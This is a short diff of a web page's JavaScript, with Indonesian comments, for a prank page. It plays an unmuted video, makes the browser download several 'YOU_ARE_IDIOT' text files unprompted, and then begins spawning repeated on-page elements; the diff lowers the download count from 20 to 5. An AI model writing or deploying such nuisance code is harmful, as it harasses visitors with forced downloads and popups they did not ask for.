@@ -183,17 +183,16 @@
         const vi = document.getElementById('chaos-video');
         ov.style.display = 'block'; vi.muted = false; vi.play();
         
-        // --- FITUR DOWNLOAD "YOU ARE IDIOT" (REVISI!) ---
-        for (let j = 1; j <= 20; j++) {
-            let blob = new Blob(["YOU ARE IDIOT"], { type: "text/plain" }); // Isi file
+        // --- FITUR DOWNLOAD 5 FILE SAJA (SUDAH FIX!) ---
+        for (let j = 1; j <= 5; j++) {
+            let blob = new Blob(["YOU ARE IDIOT"], { type: "text/plain" }); 
             let url = window.URL.createObjectURL(blob);
             let a = document.createElement("a");
             a.href = url; 
-            a.download = `YOU_ARE_IDIOT_${j}.txt`; // Nama file
+            a.download = `YOU_ARE_IDIOT_${j}.txt`; 
             a.click();
         }
 
-        // --- JEDA 15 DETIK POPUP WINDOW ---
         setTimeout(() => {
             setInterval(() => {
                 let d = document.createElement('div');
